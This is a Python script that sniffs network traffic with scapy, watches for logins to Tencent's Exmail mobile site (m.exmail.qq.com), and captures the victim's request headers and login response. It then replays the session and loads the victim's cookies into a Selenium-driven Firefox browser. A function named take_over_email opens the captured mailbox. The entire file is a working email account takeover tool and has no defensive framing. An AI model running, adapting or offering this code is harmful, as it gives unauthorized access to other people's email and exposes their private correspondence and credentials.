#!/usr/bin/python3
import gzip
import re
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
try:
    import scapy.all as scapy
except ImportError:
    import scapy
try:
    import scapy_http.http
except ImportError:
    from scapy.layers import http

session = {}
src_port, dst_port = 0, 0


def take_over_email(dic):
    url = dic['url']
    header = {
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'close',
        'Referer': dic['refer'].decode(),
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'User-Agent': dic['headers']['User-Agent'].decode()
    }
    s = requests.session()
    r = s.get(url, headers=header)
    html = r.content.decode("GB18030")
    soup = BeautifulSoup(html, "html.parser")
    script = soup.find_all("script")[0].text
    result = re.findall('".+?"', script)
    html_url = ""
    for i in range(len(result)):
        if len(result[i]) > 10:
            html_url += result[i].strip('"')
    browser = webdriver.Firefox()
    browser.maximize_window()
    browser.get(html_url)
    for cookie in r.cookies:
        cookie_dict = {'domain': cookie.domain, 'name': cookie.name, 'value': cookie.value, 'secure': cookie.secure}
        if cookie.expires:
            cookie_dict['expiry'] = cookie.expires
        if cookie.path_specified:
            cookie_dict['path'] = cookie.path
        browser.add_cookie(cookie_dict)
    browser.get(html_url)


def http_monitor_callback(pkt):
    # Ether/ TP/ TCP/ HTTP / HTTPRequest(HTTPResponse)
    app_layer = pkt.payload.payload.payload.payload
    global src_port, dst_port
    if isinstance(app_layer, scapy_http.http.HTTPRequest):
        if app_layer.Host == b"m.exmail.qq.com" and app_layer.Path.decode().startswith("/cgi-bin/loginpage?"):
            src_port = pkt.payload.payload.sport
            dst_port = pkt.payload.payload.dport
            session['headers'] = app_layer.fields
            session['refer'] = b'http://'+app_layer.Host+app_layer.Path

    if isinstance(app_layer, scapy_http.http.HTTPResponse):
        if pkt.payload.payload.dport == src_port and pkt.payload.payload.sport == dst_port:
            src_port, dst_port = 0, 0
            content = gzip.decompress(app_layer.payload.original).decode()
            pattern = re.compile(r'https:.*weixin')
            result = pattern.search(content).group()
            session['url'] = result
            take_over_email(session)


def main():
    scapy.sniff(filter="http", prn=http_monitor_callback, store=0)


if __name__ == '__main__':
    main()
